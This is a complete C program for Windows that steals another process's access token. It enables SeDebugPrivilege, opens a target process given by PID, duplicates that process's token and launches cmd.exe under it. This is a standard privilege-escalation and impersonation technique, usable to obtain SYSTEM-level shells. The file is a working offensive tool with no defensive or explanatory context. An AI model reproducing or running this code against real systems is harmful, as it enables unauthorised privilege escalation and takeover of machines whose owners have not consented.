#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "advapi32.lib")

void EnablePrivileges(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {

	TOKEN_PRIVILEGES tp;
	LUID luid;

	LookupPrivilegeValue(NULL, lpszPrivilege, &luid);

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
}

int main(int argc, char* argv[]) {

	if (argc < 2) {
		printf("[!] Usage: Program.exe <TargetPID>");
		return EXIT_FAILURE;
	}


	int TargetPID = atoi(argv[1]);

	HANDLE TokenHandle = NULL;
	HANDLE DuplicateTokenHandle = NULL;
	STARTUPINFO stinfo = { 0 };
	PROCESS_INFORMATION pinfo = { 0 };
	ZeroMemory(&stinfo, sizeof(STARTUPINFO));
	ZeroMemory(&pinfo, sizeof(PROCESS_INFORMATION));
	stinfo.cb = sizeof(STARTUPINFO);

	HANDLE CurrentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle);
	if (getCurrentToken == 0) {
		printf("[!] OpenProcessToken() Failed.\nExiting with error: %ld", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] OpenProcessToken() success.\n");
	Sleep(400);

	EnablePrivileges(CurrentTokenHandle, SE_DEBUG_NAME, TRUE);

	HANDLE rProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, TargetPID);
	if (rProc == NULL) {
		printf("[!] Failed to get handle to the target process.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Got an handle to the target process.\n");
	Sleep(400);

	BOOL rToken = OpenProcessToken(rProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle);
	if (rToken == 0) {
		printf("[!] OpenProcessToken() Failed.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] OpenProcessToken() success.\n");
	Sleep(400);

	BOOL ImpersonateUser = ImpersonateLoggedOnUser(TokenHandle);

	DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DuplicateTokenHandle);

	if (!CreateProcessWithTokenW(DuplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &stinfo, &pinfo)) {
		printf("[!] CreateProcessWithTokenW() Failed.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Process created with the token of target process. PID: %ld\n", TargetPID);
	Sleep(400);
	printf("[+] New Process created with PID: %ld\n", pinfo.dwProcessId);

	return EXIT_SUCCESS;
}